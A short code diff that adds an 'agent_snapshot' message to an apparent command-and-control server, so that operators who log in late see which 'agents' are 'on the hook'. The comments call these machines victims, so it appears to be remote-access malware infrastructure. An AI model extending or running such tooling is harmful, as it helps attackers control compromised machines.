@@ -161,6 +161,13 @@ class ClientHandler(threading.Thread):
                 })
             log.info("Authenticated: %s:%s  role=%s", *self.addr, self.role)
             self._send({"status": "ok", "message": f"Authenticated as {self.role}"})
+            if self.role == "operator":
+                # Late-joining operators: tell them which agents are ALREADY
+                # on the hook, so victim identity doesn't depend on having
+                # witnessed the agent_joined moment.
+                with _agents_lock:
+                    peers = [f"{h.addr[0]}:{h.addr[1]}" for h in _agents]
+                self._send({"event": "agent_snapshot", "peers": peers})
             return
 
         # ── Agent push event → broadcast to all operators ──────────────
@@ -260,6 +267,13 @@ class ClientHandler(threading.Thread):
                 })
             log.info("Authenticated: %s:%s  role=%s", *self.addr, self.role)
             self._send({"status": "ok", "message": f"Authenticated as {self.role}"})
+            if self.role == "operator":
+                # Late-joining operators: tell them which agents are ALREADY
+                # on the hook, so victim identity doesn't depend on having
+                # witnessed the agent_joined moment.
+                with _agents_lock:
+                    peers = [f"{h.addr[0]}:{h.addr[1]}" for h in _agents]
+                self._send({"event": "agent_snapshot", "peers": peers})
             return
 
         # ── Agent: push event → broadcast; command response → pending queue ──
